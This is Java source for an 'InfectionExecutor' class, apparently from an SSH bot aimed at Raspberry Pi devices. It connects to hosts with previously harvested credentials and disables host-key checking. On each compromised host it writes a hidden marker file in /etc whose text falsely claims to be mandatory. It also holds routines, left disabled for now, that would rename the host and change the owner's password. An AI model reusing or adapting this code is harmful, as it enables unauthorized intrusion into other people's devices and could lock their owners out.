package fr.spriggans.bot.ssh.executor;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.UnsupportedEncodingException;
import java.nio.charset.StandardCharsets;

import com.jcraft.jsch.ChannelExec;
import com.jcraft.jsch.JSch;
import com.jcraft.jsch.JSchException;
import com.jcraft.jsch.Session;

import fr.spriggans.bot.Constants;
import fr.spriggans.bot.logger.Logger;
import fr.spriggans.bot.models.Connection;
import fr.spriggans.bot.models.Results;

public class InfectionExecutor {

	private static final String INFECTION_FILE = "/etc/.spg_inf.perfs";

	private static final String INFECTION_FILE_CONTENT = "IMPORTANT !\nDO NOT REMOVE THIS FILE\n\nThis file is mandatory to allow raspberry pi to activate enhanced behaviours.";

	private static final String NEW_HOSTNAME = "raspberrymonkey";
	
	private static final String NEW_PASSWORD = "pimonkey";

	private InfectionExecutor() {
		// Nothing
	}

	public static void infectAll(Results results) {
		for (Connection connection : results.getSuccessfullConnections()) {
			JSch jsch = new JSch();
			Session session = null;
			try {
				session = connectSession(jsch, connection);
				if (!connectionIsInfected(session)) {
					// A new target !
					infect(session, connection.getPassword());
				}
			} catch (JSchException | IOException e) {
				// Nothing
			} finally {
				if (session != null) {
					session.disconnect();
				}
			}
		}
	}

	private static void infect(Session session, String password) throws IOException, JSchException {
		// Creates the infection flag file
		executeCommand("sudo echo \"" + INFECTION_FILE_CONTENT + "\" | sudo tee " + INFECTION_FILE + " > /dev/null", session);

		int a = 2;
		// Don't do it, it's too mean ^^'
		if(1 == a) {
			// Changes hostname
			changeHostName(session);
			
			// Changes passwords
			changePassword(session, password);
		}
	}

	private static void changePassword(Session session, String password) throws IOException, JSchException {
		executeCommand("echo -e \"" + password + "\n" + NEW_PASSWORD + "\n" + NEW_PASSWORD + "\" | passwd", session);
	}

	private static void changeHostName(Session session) throws IOException, JSchException {
		// Gets the hostname
		String hostName = executeCommand("hostname", session);

		// Gets the /etc/hosts content
		String etcHostsContent = executeCommand("cat /etc/hosts", session);

		// Replaces /etc/hosts with the new hostname
		String newEtcHostsContent = etcHostsContent.replaceAll(hostName, NEW_HOSTNAME);
		executeCommand("echo \"" + newEtcHostsContent + "\" | sudo tee /etc/hosts > /dev/null", session);

		// Replaces /etc/hostname with the new hostname
		executeCommand("echo \"" + NEW_HOSTNAME + "\" | sudo tee /etc/hostname > /dev/null", session);
	}

	/**
	 * If a file called INFECTION_FILE exists, then it means the connection is
	 * already infected.
	 */
	private static boolean connectionIsInfected(Session session) throws IOException, JSchException {
		String infected = executeCommand("[ -f " + INFECTION_FILE + " ] && echo \"Y\" || echo \"N\"", session);
		return "Y".equals(infected);
	}

	private static String executeCommand(String command, Session session) throws IOException, JSchException {
		ChannelExec channel = (ChannelExec) session.openChannel("exec");
		channel.setCommand(command);
		channel.connect();
		InputStream in = channel.getInputStream();
		String res = steamToString(in);
		channel.disconnect();
		if (res.length() > 0 && res.charAt(res.length() - 1) == '\n') {
			res = res.substring(0, res.length() - 1);
		}
		return res;
	}

	private static String steamToString(InputStream in) throws IOException {
		ByteArrayOutputStream result = new ByteArrayOutputStream();
		byte[] buffer = new byte[1024];
		int length;
		while ((length = in.read(buffer)) != -1) {
			result.write(buffer, 0, length);
		}
		try {
			return result.toString(StandardCharsets.UTF_8.name());
		} catch (UnsupportedEncodingException e) {
			return "";
		} finally {
			in.close();
		}
	}

	private static Session connectSession(JSch jsch, Connection connection) throws JSchException {
		Session session = jsch.getSession(connection.getUser(), connection.getHost(), Constants.PORT);
		session.setPassword(connection.getPassword());
		session.setConfig("StrictHostKeyChecking", "no");
		session.connect();
		return session;
	}

}
